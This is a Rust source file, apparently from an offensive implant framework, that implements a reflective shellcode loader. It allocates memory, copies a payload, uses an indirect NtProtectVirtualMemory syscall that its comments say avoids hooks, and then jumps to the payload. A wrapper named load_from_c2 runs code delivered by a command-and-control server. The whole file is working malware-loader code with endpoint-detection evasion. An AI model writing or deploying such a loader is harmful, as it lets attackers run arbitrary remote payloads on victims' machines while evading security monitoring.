//! loader.rs — Reflective shellcode/PE loader
//!
//! Allocates a RW region, copies the payload, then uses
//! NtProtectVirtualMemory (indirect syscall) to flip it RX before
//! jumping to the entry point via a function pointer cast.

#![allow(dead_code, non_snake_case)]

use winapi::um::memoryapi::VirtualAlloc;
use winapi::um::winnt::{
    MEM_COMMIT, MEM_RESERVE,
    PAGE_EXECUTE_READ, PAGE_READWRITE,
};
use winapi::shared::minwindef::DWORD;

use crate::syscall::{do_syscall, get_ssn};

const NT_PROTECT: &str = "NtProtectVirtualMemory";
/// Pseudo-handle for the current process accepted by Nt* APIs.
const CURRENT_PROCESS: usize = usize::MAX; // (HANDLE)-1

/// Load and execute `payload` in the current process.
///
/// Steps:
///   1. VirtualAlloc RW.
///   2. Copy bytes.
///   3. NtProtectVirtualMemory → RX (indirect syscall, no kernel hook).
///   4. Cast + call entry point.
pub unsafe fn load_and_exec(payload: &[u8]) -> bool {
    if payload.is_empty() { return false; }

    // ------------------------------------------------------------------
    // 1. Allocate RW region.
    // ------------------------------------------------------------------
    let base = VirtualAlloc(
        core::ptr::null_mut(),
        payload.len(),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    );
    if base.is_null() { return false; }

    // ------------------------------------------------------------------
    // 2. Copy payload.
    // ------------------------------------------------------------------
    core::ptr::copy_nonoverlapping(
        payload.as_ptr(),
        base as *mut u8,
        payload.len(),
    );

    // ------------------------------------------------------------------
    // 3. NtProtectVirtualMemory RW → RX via indirect syscall.
    // ------------------------------------------------------------------
    let ssn_prot = match get_ssn(NT_PROTECT) {
        Some(s) => s,
        None    => return false,
    };

    let mut prot_base = base as usize;
    let mut prot_size = payload.len();
    let mut old_prot: u32 = 0;

    do_syscall(
        ssn_prot,
        CURRENT_PROCESS,
        &mut prot_base as *mut usize as usize,
        &mut prot_size as *mut usize as usize,
        PAGE_EXECUTE_READ as usize,
        &mut old_prot as *mut u32 as usize,
    );

    // ------------------------------------------------------------------
    // 4. Execute.
    // ------------------------------------------------------------------
    let entry: unsafe extern "C" fn() = core::mem::transmute(base);
    entry();
    true
}

/// Load a payload received from C2 into the current process.
pub unsafe fn load_from_c2(payload: &[u8]) -> bool {
    load_and_exec(payload)
}
